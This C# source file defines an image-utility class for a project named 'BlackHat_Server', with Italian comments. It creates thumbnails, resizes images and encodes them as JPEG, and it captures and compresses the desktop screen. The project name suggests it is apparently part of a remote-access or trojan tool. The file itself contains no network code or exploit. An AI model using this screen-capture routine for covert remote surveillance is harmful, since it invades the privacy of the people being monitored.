using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;

namespace BlackHat_Server
{
    internal class ImageWorker
    {
        /// <summary>
        ///     Passo un file immagine e torno un'immagine thumb
        /// </summary>
        /// <param name="par_FileImage"></param>
        /// <param name="height"></param>
        /// <param name="width"></param>
        /// <returns></returns>
        public Image GetThumbNail(string par_FileImage, int height, int width)
        {
            try
            {
                var image = Image.FromFile(par_FileImage);
                var imageThumb = image.GetThumbnailImage(width, height, null, new IntPtr());

                return imageThumb;
            }
            catch
            {
                return null;
            }
        }


        /// <summary>
        ///     Image top Byte Array
        /// </summary>
        /// <param name="imageIn"></param>
        /// <returns></returns>
        public byte[] imageToByteArray(Image imageIn)
        {
            var ms = new MemoryStream();

            imageIn.Save(ms, ImageFormat.Gif);

            var res = ms.ToArray();

            ms.Dispose();

            return res;
        }


        /// <summary>
        ///     Resize Image Con Mantenimento Proporzioni
        /// </summary>
        /// <param name="imgToResize"></param>
        /// <param name="size"></param>
        /// <returns></returns>
        public Image resizeImage(Image imgToResize, Size size)
        {
            var sourceWidth = imgToResize.Width;
            var sourceHeight = imgToResize.Height;

            float nPercent = 0;
            float nPercentW = 0;
            float nPercentH = 0;

            nPercentW = size.Width / (float) sourceWidth;
            nPercentH = size.Height / (float) sourceHeight;

            if (nPercentH < nPercentW)
                nPercent = nPercentH;
            else
                nPercent = nPercentW;

            var destWidth = (int) (sourceWidth * nPercent);
            var destHeight = (int) (sourceHeight * nPercent);

            var b = new Bitmap(destWidth, destHeight);
            var g = Graphics.FromImage(b);
            g.InterpolationMode = InterpolationMode.HighQualityBicubic;

            g.DrawImage(imgToResize, 0, 0, destWidth, destHeight);

            g.Dispose();


            return b;
        }


        /// <summary>
        ///     Desktop Resizzato
        /// </summary>
        /// <param name="width"></param>
        /// <param name="height"></param>
        /// <returns></returns>
        public byte[] DesktopImage(int width, int height, int qual)
        {
            var sc = new ScreenCapture();

            Image dk = sc.ScreenShot();
            Image dkResized = null;

            if (dk != null)
            {
                var sz = new Size(width, height);

                dkResized = resizeImage(dk, sz);

                var res = ImgToJpg(dkResized, qual);


                dk.Dispose();
                dkResized.Dispose();

                return res;
            }

            if (dk != null)
                dk.Dispose();

            if (dkResized != null)
                dkResized.Dispose();

            return null;
        }


        /// <summary>
        ///     Resize di un Image e trasformazione in jpg
        ///     NULL in caso di errore
        /// </summary>
        /// <param name="width"></param>
        /// <param name="height"></param>
        /// <returns></returns>
        public byte[] ImageResizeToJpg(Image immagine, int width, int height, int qual)
        {
            try
            {
                Image imResized = null;

                if (immagine != null)
                {
                    var sz = new Size(width, height);

                    imResized = resizeImage(immagine, sz);

                    var res = ImgToJpg(imResized, qual);


                    immagine.Dispose();
                    imResized.Dispose();

                    return res;
                }

                if (immagine != null)
                    immagine.Dispose();

                if (imResized != null)
                    imResized.Dispose();

                return null;
            }
            catch
            {
                return null;
            }
        }
        //----------------------------------------------------------


        /// <summary>
        ///     Da Img a jpg
        /// </summary>
        /// <param name="originalImage"></param>
        /// <param name="quality"></param>
        /// <returns></returns>
        public byte[] ImgToJpg(Image originalImage, long quality)
        {
            var ms = new MemoryStream();

            // Encoder parameter for image quality
            var qualityParam = new EncoderParameter(Encoder.Quality, quality);

            // Jpeg image codec
            var jpegCodec = getEncoderInfo("image/jpeg");
            if (jpegCodec == null)
                return null;

            var encoderParams = new EncoderParameters(1);
            encoderParams.Param[0] = qualityParam;

            originalImage.Save(ms, jpegCodec, encoderParams);

            return ms.ToArray();
        }

        private ImageCodecInfo getEncoderInfo(string mimeType)
        {
            // Get image codecs for all image formats
            var codecs = ImageCodecInfo.GetImageEncoders();

            // Find the correct image codec
            for (var i = 0; i < codecs.Length; i++)
                if (codecs[i].MimeType == mimeType)
                    return codecs[i];
            return null;
        }
    }
}